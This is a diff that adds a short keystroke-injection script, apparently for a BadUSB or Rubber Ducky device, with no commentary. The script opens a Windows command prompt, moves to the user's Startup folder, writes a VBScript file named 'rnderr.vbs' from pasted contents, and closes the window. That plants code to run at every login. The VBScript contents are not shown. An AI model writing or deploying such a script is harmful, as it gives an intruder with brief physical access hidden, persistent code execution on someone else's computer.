@@ -1,0 +1,14 @@
+GUI R
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+STRING copy con rnderr.vbs
+ENTER
+PASTE rnderr.vbs
+CTRL Z
+ENTER
+STRING exit
+ENTER
